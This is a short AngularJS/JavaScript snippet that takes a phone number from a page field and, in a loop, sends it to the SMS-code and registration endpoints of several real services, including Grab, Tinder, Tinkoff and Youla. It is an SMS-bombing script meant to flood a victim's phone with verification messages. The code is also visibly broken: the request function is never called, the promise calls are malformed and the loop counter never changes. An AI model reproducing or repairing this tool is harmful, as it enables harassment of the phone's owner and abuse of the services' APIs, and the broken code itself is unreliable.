angular.module("app", [])

  .controller("MainCtrl", function ($scope) {

    $scope.heading = "AngularJS";

    var i = 0

    

    var addTime = document.getElementById('add');

    

    addTime.addEventListener('click', getN)

    function getN() {

      var _phone = document.getElementById('number').value;

      var i= 5

      console.log("good")

      console.log(_phone)

    

    

      

    

      

      document.getElementById('number').setAttribute("readonly", "readonly")

    while  (i>0){

      console.log(i)

      function MyController($scope, $http) { 

      var headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'}

      $.post ("https://p.grabtaxi.com/api/passenger/v2/profiles/register", {'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'} );

            then(function success(response) {

                console.log('grabtaxi send');

          });

        $.post('https://belkacar.ru/get-confirmation-code' , { "phone":_phone });

        then(function success(response) {

            console.log('belkacar sent ');

        }) ;

        $http(post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' , { "phone":_phone }, headers));

        then(function success(response) {

            console.log('tinder sent ');

        }) ;

        $http(post('https://app.karusel.ru/api/v1/phone/' , { "phone":_phone }, headers));

        then(function success(response) {

            console.log('karusel sent ');

        }) ;

        $http(post('https://api.tinkoff.ru/v1/sign_up' , { "phone":"+"+_phone }, headers));

        then(function success(response) {

            console.log('tinkoff sent');

        }) ;

        $http(post('https://api.mtstv.ru/v1/users' , { "msisdn":_phone }, headers));

        then(function success(response) {

            console.log('mtstv sent ');

        }) ;

        $http(post('https://youla.ru/web-api/auth/request_code' , { "phone":_phone }, headers));

        then(function success(response) {

            console.log('youla sent');

        }) ;

    }}} 

  });
